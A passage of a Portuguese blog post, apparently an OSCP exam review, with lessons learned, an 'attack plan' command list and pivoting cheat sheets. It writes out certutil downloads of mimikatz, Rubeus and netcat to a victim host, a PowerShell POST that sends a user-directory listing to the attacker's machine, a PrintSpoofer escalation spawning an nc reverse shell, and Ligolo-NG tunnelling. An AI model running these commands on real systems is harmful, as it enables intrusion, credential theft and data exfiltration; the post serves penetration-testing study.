class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h1 id="https://www.notion.so/6f661c9bc16542218533262ea8e5a594" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/6f661c9bc16542218533262ea8e5a594"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">LI√á√ïES APRENDIDAS</span></span></h1><div id="https://www.notion.so/89b2e18929724d38aaea651c203b403a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/1daa049eaab544cdbb424a1e801b3b23" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">D√° para fazer! </span></span></li><li id="https://www.notion.so/71de564c49804e67abf21669cabc08a9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">A OSCP me fez enxergar ainda mais que nem tudo √© vulnerabilidade. O fator usu√°rio √© muito importante nessa conta. Uma credencial colocada em um arquivo, uma senha compartilhada em uma mensagem, um texto que pode ter sido utilizado como senha, tudo isso pode levar ao comprometimento da m√°quina (por exemplo, acesso ssh, Evil-WinRM) sem nem mesmo precisar explorar uma √∫nica vulnerabilidade. </span></span></li><li id="https://www.notion.so/7c907082ca7540d786268394f109f3aa" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Enumerar √© preciso! Melhorar cada vez mais essa t√©cnica de fuzzing a fim de tentar encontrar o que ningu√©m v√™: aquele arquivo deixado no servidor web, aquele diret√≥rio que a pessoa achou que ningu√©m acharia s√≥ por n√£o estar indexado, etc. </span></span></li><li id="https://www.notion.so/4825e669583540aeb555e103f1703644" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Se enumerar √© preciso, √© preciso estar atendo. Para que voc√™ vai enumerar Index.html, index.html, INDEX.html, usando uma lista, se pode procurar s√≥ por index.html caso a m√°quina seja windows ?! Mais r√°pido, menos barulho!</span></span></li><li id="https://www.notion.so/ef0209a88b3047ebbd60ba7998b555c5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Uma vulnerabilidade pode n√£o estar corrigida mas pode estar mitigada, logo, pode ser que voc√™ n√£o consiga explor√°-la. </span></span></li><li id="https://www.notion.so/77d3ab12e64d4b749434336e9e759e5a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Cada vez mais √© correto o pensamento de passar 90% do tempo afiando o machado e os 10% restante cortando a √°rvore! Planejar, antever, se preparar √© necess√°rio. </span></span></li></ul><div id="https://www.notion.so/eacf09559f8946e69f4f782db50cd14d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h1 id="https://www.notion.so/40b2b4071a15495ba38379078c209c5b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/40b2b4071a15495ba38379078c209c5b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">PLANO DE ATAQUE</span></span></h1><div id="https://www.notion.so/587b47e8d668409984001465384e2bb4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Abaixo √© um pequeno exemplo do que deixei anotado (muitos podem chamar de metodologia, mas eu n√£o coloquei metodologia por ser simplesmente um conjunto de comandos que deixei anotado para executar logo que iniciar ou a medida que fosse avan√ßando) </span></span></p></div><div id="https://www.notion.so/9fa53028c7b447e5bbca1732a401b3c9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/48d25ceaca2744aeb5892f5c98a15eb6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>
PREPARACAO NO DECORRER DOS ESTUDOS:
<span class="token function">cat</span> /usr/share/dirb/wordlists/common.txt /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt <span class="token operator">></span> /home/kali/wordlists/my-list.txt
<span class="token function">cat</span> /home/kali/wordlists/my-list.txt <span class="token operator">|</span> <span class="token function">sort</span> <span class="token parameter variable">-u</span>  <span class="token operator">></span> /home/kali/wordlists/my-list-linux.txt
<span class="token function">cat</span> /home/kali/wordlists/my-list.txt <span class="token operator">|</span> <span class="token function">sort</span> <span class="token parameter variable">-fu</span> <span class="token operator">></span> /home/kali/wordlists/my-list-windows.txt

<span class="token builtin class-name">echo</span> public <span class="token operator">></span> community
<span class="token builtin class-name">echo</span> private <span class="token operator">>></span> community
<span class="token builtin class-name">echo</span> manager <span class="token operator">>></span> community


ENUMERA√á√ÉO INICIAL: 

<span class="token function">vim</span> hosts.txt <span class="token comment"># put all hosts in this file</span>
autorecon <span class="token parameter variable">-t</span> hosts.txt --nmap-append<span class="token operator">=</span><span class="token string">"--min-rate 2000"</span> --exclude-tags<span class="token operator">=</span><span class="token string">"top-100-udp-ports"</span> --exclude-tags nikto --exclude-tags dirbuster <span class="token parameter variable">-vv</span> <span class="token parameter variable">-o</span> autorecon-results

onesixtyone <span class="token parameter variable">-c</span> community <span class="token parameter variable">-i</span> hosts


<span class="token assign-left variable">IP</span><span class="token operator">=</span><span class="token number">1.1</span>.1.1<span class="token punctuation">;</span><span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">;</span><span class="token assign-left variable">OS</span><span class="token operator">=</span><span class="token string">"windows"</span><span class="token punctuation">;</span>ffuf <span class="token parameter variable">-u</span> http://<span class="token variable">$IP</span><span class="token builtin class-name">:</span><span class="token variable">$PORT</span>/FUZZ <span class="token parameter variable">-w</span> /home/kali/wordlists/my-list-<span class="token variable">$OS</span>.txt <span class="token parameter variable">-c</span> <span class="token parameter variable">-ic</span> <span class="token parameter variable">-mc</span> all <span class="token parameter variable">-fc</span> <span class="token number">404</span> <span class="token parameter variable">-t</span> <span class="token number">300</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> resultado-ffuf-<span class="token variable">$IP</span>.txt


POST EXPLOITATION WINDOWS:

UPLOAD TOOLS:
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>tee-x64.exe          c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>tee.exe
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>winpeasx64.exe       c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>winpeasx64.exe
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>/ligolo-ng/agent.exe c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>agent.exe
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>accesschk64.exe      c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>accesschk64.exe 
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>nc.exe               c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>nc.exe
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>mimikatz.exe         c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>mimikatz.exe 
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>/sessiongopher.ps1   c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>sessiongopher.ps1
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>/PowerUp.ps1         c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>PowerUp.ps1
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>/PowerView.ps1       c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>PowerView.ps1
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>/rubeus.exe          c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>rubeus.exe

INFOS:
<span class="token function">dir</span> c:<span class="token punctuation">\</span> <span class="token comment"># Something different on the root ?!?!</span>
tree c:<span class="token punctuation">\</span>users /F /A  <span class="token operator">|</span> c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>tee.exe <span class="token parameter variable">-a</span> c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>exfil-dir-users.txt
Invoke-RestMethod <span class="token parameter variable">-Uri</span>  http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>/  <span class="token parameter variable">-Method</span> Post <span class="token parameter variable">-Headers</span> @<span class="token punctuation">{</span> <span class="token string">"File-Name"</span> <span class="token operator">=</span> <span class="token string">"exfil-dir-users.txt"</span> <span class="token punctuation">}</span> <span class="token parameter variable">-InFile</span> <span class="token string">"c:\users\public<span class="token entity" title="\e">\e</span>xfil-dir-users.txt"</span>

PRIVESC:
certutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://<span class="token operator">&lt;</span>ip-kali<span class="token operator">></span>/windows-privesc/printspoofer64.exe c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>printspoofer.exe
c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>public<span class="token punctuation">\</span>printspoofer.exe <span class="token parameter variable">-c</span> <span class="token string">"c:\users\public<span class="token entity" title="\n">\n</span>c &lt;ip-kali> 1337 -e cmd.exe"</span>
</span></span></span></code></pre><h1 id="https://www.notion.so/3bb361d7e30a4a71ac7201b7352d41ed" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/3bb361d7e30a4a71ac7201b7352d41ed"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">CHEAT SHEETS </span></span></h1><div id="https://www.notion.so/448873e9e0234a918761ad34585931ba" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Algumas anota√ß√µes de comandos que fiz para ter acesso r√°pido e alguns links de cheat sheets que achei interessante e podem ajudar.</span></span></p></div><h2 id="https://www.notion.so/3bf47b105c294612b74e353f3c6b5ead" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/3bf47b105c294612b74e353f3c6b5ead"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">REVERSE SHELL</span></span></h2><div id="https://www.notion.so/bea34afde70946ee9eb379e31d9a922c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Acesse </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://www.revshells.com">http://www.revshells.com</a></span><span class="SemanticString"> e seja feliz. Tem tudo l√°! </span></span></p></div><h2 id="https://www.notion.so/173bef2a2c6949fe811a2c194f0b4ca4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/173bef2a2c6949fe811a2c194f0b4ca4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">PIVOTING</span></span></h2><h3 id="https://www.notion.so/005653bdd8274eaab6b5a31d9241bcb5" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/005653bdd8274eaab6b5a31d9241bcb5"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Ligolo-NG (</span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown">‚Ä£</span></span><span class="SemanticString">) </span></span></h3><div id="https://www.notion.so/7b7c30b95490476192d34921a44354e8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.youtube.com/watch?v=DM1B8S80EvQ">https://www.youtube.com/watch?v=DM1B8S80EvQ</a></span></span></p></div><div id="https://www.notion.so/ddbafc4617dc43b1a230562458cbd101" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://medium.com/@Poiint/pivoting-with-ligolo-ng-0ca402abc3e9">https://medium.com/@Poiint/pivoting-with-ligolo-ng-0ca402abc3e9</a></span></span></p></div><div id="https://www.notion.so/7a0bf7394a5f412d90f6da6e1ffcbf09" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/16dc62d039ef49419118d96fb531ce89" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">agent ‚Üí execut√°vel que rodar√° na v√≠tima!</span></span></p></div><div id="https://www.notion.so/6de8fc346935470c97b463d748a5cb51" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">proxy ‚Üí interface do ligolo-ng no seu kali que comandar√° tudo!</span></span></p></div><div id="https://www.notion.so/59c5b8ccd8524f36afa3cd4cf30b2125" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/124fab77aca44f71b9e8964b4b58a7e3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fb131a426bf415b85f627f3a0db2814" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">ON KALI</span></span></p></div><pre id="https://www.notion.so/9967c77cd91144108d3001450b1c2381" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token function">sudo</span> <span class="token function">ip</span> tuntap <span class="token function">add</span> user kali mode tun ligolo
<span class="token function">sudo</span> <span class="token function">ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> ligolo up

/home/kali/tools/ligolo-ng/proxy <span class="token parameter variable">-selfcert</span></span></span></span></code></pre><div id="https://www.notion.so/ed668a35ba9b4e67a626f451a47cf701" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">ON VICTIM WINDOWS</span></span></p></div><pre id="https://www.notion.so/ea39b13dd7cb4bebbc0e23e59a45cf56" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>c:\>c:\users\public\agent<span class="token punctuation">.</span>exe <span class="token operator">-</span>connect &lt;kali-ip>:11601 <span class="token operator">--</span>ignore-cert
</span></span></span></code></pre><div id="https://www.notion.so/f35a3d452c2946969a04638bb16788c1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">ON KALI</span></span></p></div><pre id="https://www.notion.so/970ba5f726a349d6a02609c5a0e17e7d" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>ligolo<span class="token operator">></span> session  <span class="token comment">#-> Choose  1</span>
ligolo-session<span class="token operator"><span class="token file-descriptor important">1</span>></span> <span class="token function">ifconfig</span> <span class="token comment">#-> get internal network range at other interface (ex: 10.10.10.1/24)</span>

kali<span class="token comment"># sudo ip route add 10.10.10.0/24 dev ligolo</span>

ligolo-session<span class="token operator"><span class="token file-descriptor important">1</span>></span> start

use the tools, like:
<span class="token comment"># crackmapexec smb 10.10.10.0/24</span></span></span></span></code></pre><div id="https://www.notion.so/aacabd2bdc3c453d91178878ef497801" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/d772b878d48749c8b12cf41e83b1d581" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Se precisar acessar seu kali a partir de uma m√°quina interna, por exemplo, crie um listenner no agente para que ele redirecione a comunica√ß√£o para seu Kali! </span></span></p></div><div id="https://www.notion.so/02a49c4e600d4f67a3fe83d6a3e7ae62" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/be1a933e237540c89353e80339efe9b5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">ON KALI</span></span></p></div><pre id="https://www.notion.so/5ea7f94265a84616bfa0e43bb9db61c8" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>ligolo-session1&gt; listener_list
ligolo-session1&gt; listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp</span></span></span></code></pre><div id="https://www.notion.so/a612d9c2751c47fe8a3a8f0dcbcd7402" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Agora, quando uma m√°quina interna tentar acessar o</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"> IP interno da m√°quina que tem o agente rodando</strong></span><span class="SemanticString">, na porta 8080, o tr√°fego ser√° redirecionado, pelo agente, para a porta 80 do kali. Sim, o IP no par√¢metro </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">--to</code></span><span class="SemanticString"> √© 127.0.0.1 e n√£o o IP do kali! √â tipo, o agente ao receber a comunica√ß√£o nessa porta entende algo como: √â para mim, deixa eu mandar para o meu proxy! </span></span></p></div><div id="https://www.notion.so/7739e9ce78404d4e8d31c60ed4fad452" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a88f5ec90d56448e849e18a3c9da78f2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Agora vamos supor que existe um site na m√°quina invadida ou algum servi√ßo, que s√≥ escute na interface local, ou seja, eu n√£o consigo acessar de fora, s√≥ da pr√≥pria m√°quina!  </span></span></p></div><div id="https://www.notion.so/f6a9d618033f44ada7885b8bd30a26a3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Criamos um Listener no agente para que qualquer conex√£o que v√° para uma porta XPTY seja redirecionada para a pr√≥pria m√°quina na porta interna que ele t√° escutando. </span></span></p></div><div id="https://www.notion.so/277e51bd894e417082934c9c7f06ebe6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Vamos exemplificar com um servi√ßo web que s√≥ √© acess√≠vel na pr√≥pria m√°quina atrav√©s do endere√ßo, por exemplo, </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://127.0.0.1/phpmyadmin">http://127.0.0.1/phpmyadmin</a></span><span class="SemanticString"> : </span></span></p></div><div id="https://www.notion.so/9c3e9324342a4bc4a8b160bccb577bf1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/58de5e00450a4f149121a79ae963aa25" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">NO KALI</span></span></p></div><pre id="https://www.notion.so/37b1db38f6274eb4a0e4a2034e0ff823" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>ligolo-session<span class="token operator"><span class="token file-descriptor important">1</span>></span> listener_list
ligolo-session<span class="token operator"><span class="token file-descriptor important">1</span>></span> listener_add <span class="token parameter variable">--addr</span> <span class="token number">0.0</span>.0.0:8081 <span class="token parameter variable">--to</span> <span class="token operator">&lt;</span>ip_interface_interna_maquina_invadida<span class="token operator">></span>:80 <span class="token parameter variable">--tcp</span></span></span></span></code></pre><div id="https://www.notion.so/029e0f7a831b41b19269661c2838d86f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5966fb1f20b44fa29486dc56e6b2af3e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Agora voc√™ pode no seu kali acessar http://&lt;ip-externo-maquina-invadida&gt;:8081 e conseguir√° acessar o site que estaria dispon√≠vel apenas internamente! </span></span></p></div><div id="https://www.notion.so/2c55e4db0e364ef0bad68b07ccda270a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/93800d6fac7a4c60afa309322e92cc52" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h2 id="https://www.notion.so/96094fc6dee14861bb847f9b1b974148" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/96094fc6dee14861bb847f9b1b974148"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Powershell e Comandos Windows</span></span></h2><pre id="https://www.notion.so/f2cc4d99f53e40ba92b5ddfd6b28a157" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#PORTAS ABERTAS</span>
netstat <span class="token operator">-</span>tupan

<span class="token comment">#HABILITAR TELNET NO WINDOWS 7</span>
pkgmgr <span class="token operator">/</span>iu:‚ÄùTelnetClient‚Äù

<span class="token comment">#PING SWEEP WINDOWS</span>
<span class="token keyword">for</span> <span class="token operator">/</span>L <span class="token operator">%</span>i in <span class="token punctuation">(</span>1<span class="token punctuation">,</span>1<span class="token punctuation">,</span>255<span class="token punctuation">)</span> <span class="token keyword">do</span> @ping <span class="token operator">-</span>n 1 <span class="token operator">-</span>w 200 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span><span class="token operator">%</span>i > nul &amp;&amp; <span class="token function">echo</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span><span class="token operator">%</span>i is up<span class="token punctuation">.</span></span></span></span></code></pre><div id="https://www.notion.so/9d065eff6d244f85971c63c719d2a4e0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></article>
  <footer class="Footer">
  <div>&copy; www.offensivethink.com 2024</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
      rel="noopener noreferrer">Notablog</a>.
  </div>
</footer>

</body>

</html>